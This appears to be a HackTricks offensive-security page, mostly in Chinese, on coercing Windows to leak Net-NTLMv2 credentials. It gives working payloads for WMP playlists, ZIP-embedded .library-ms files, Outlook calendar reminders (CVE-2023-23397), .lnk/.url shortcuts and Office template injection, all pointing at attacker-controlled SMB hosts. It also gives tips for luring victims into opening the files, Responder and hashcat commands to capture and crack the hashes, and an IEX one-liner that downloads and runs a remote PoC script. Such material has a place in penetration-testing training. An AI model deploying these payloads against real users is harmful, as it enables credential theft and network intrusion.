# 窃取 NTLM creds 的地点

{{#include ../../banners/hacktricks-training.md}}

**查看来自 [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) 的所有好点子，从在线下载 Microsoft Word 文件 到 ntlm leaks 源: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md 和 [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player 播放列表 (.ASX/.WAX)

如果你能让目标打开或预览由你控制的 Windows Media Player 播放列表，你可以通过将条目指向 UNC path 来 leak Net‑NTLMv2。WMP 会尝试通过 SMB 获取引用的媒体并会隐式地进行身份验证。

示例 payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
收集与破解流程：
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP 内嵌 .library-ms NTLM leak (CVE-2025-24071/24055)

Windows 资源管理器在从 ZIP 存档中直接打开 .library-ms 文件时处理不安全。如果库定义指向远程 UNC 路径（例如 \\attacker\share），仅在 ZIP 中浏览/启动 .library-ms 就会导致资源管理器枚举该 UNC 并向攻击者发出 NTLM 鉴权。这样会产生一个 NetNTLMv2，可以离线破解或可能被中继。

指向攻击者 UNC 的最小 .library-ms
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- 使用上面的 XML 创建 .library-ms 文件（设置你的 IP/hostname）。
- 将其压缩为 ZIP（在 Windows: Send to → Compressed (zipped) folder）并将 ZIP 交付给目标。
- 运行一个 NTLM capture listener 并等待受害者从 ZIP 中打开 .library-ms。


### Outlook 日历提醒声音路径 (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows 会处理日历项中的扩展 MAPI 属性 PidLidReminderFileParameter。如果该属性指向一个 UNC 路径（例如 \\attacker\share\alert.wav），当提醒触发时，Outlook 会联系该 SMB 共享，leaking the user’s Net‑NTLMv2 without any click。该问题已于 March 14, 2023 修补，但对遗留/未打补丁的设备群以及历史事件响应仍然高度相关。

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
监听端:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
注意
- 受害者只需要在提醒触发时运行 Outlook for Windows。
- 该 leak 输出 Net‑NTLMv2，适用于离线破解或 relay（不是 pass‑the‑hash）。


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer 会自动渲染快捷方式图标。最近的研究表明，即使在微软 2025 年 4 月针对 UNC‑icon 快捷方式发布补丁之后，仍然可以通过将快捷方式目标托管在 UNC 路径上并将图标保留为本地，在无需点击的情况下触发 NTLM 身份验证（绕过补丁并获得 CVE‑2025‑50154）。仅仅查看该文件夹就会导致 Explorer 从远程目标检索元数据，并向攻击者的 SMB 服务器发送 NTLM。

最小的 Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
通过 PowerShell 生成 Program Shortcut payload (.lnk)：
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- 将 shortcut 放入 ZIP 并诱使受害者浏览它。
- 将 shortcut 放到受害者会打开的可写 share 上。
- 与同一 folder 中的其他 lure files 组合，以便 Explorer 预览这些项。

### Office remote template injection (.docx/.dotm) to coerce NTLM

Office 文档可以引用外部模板。如果你将附带的模板设置为 UNC path，打开该文档时会对 SMB 进行身份验证。

Minimal DOCX relationship changes (inside word/):

1) 编辑 word/settings.xml 并添加附带的模板引用：
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) 编辑 word/_rels/settings.xml.rels 并将 rId1337 指向你的 UNC：
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) 将文件重新打包为 .docx 并交付。运行你的 SMB capture listener，等待连接打开。

有关捕获后用于 relaying 或 abusing NTLM 的思路，请查看：

{{#ref}}
README.md
{{#endref}}


## 参考资料
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
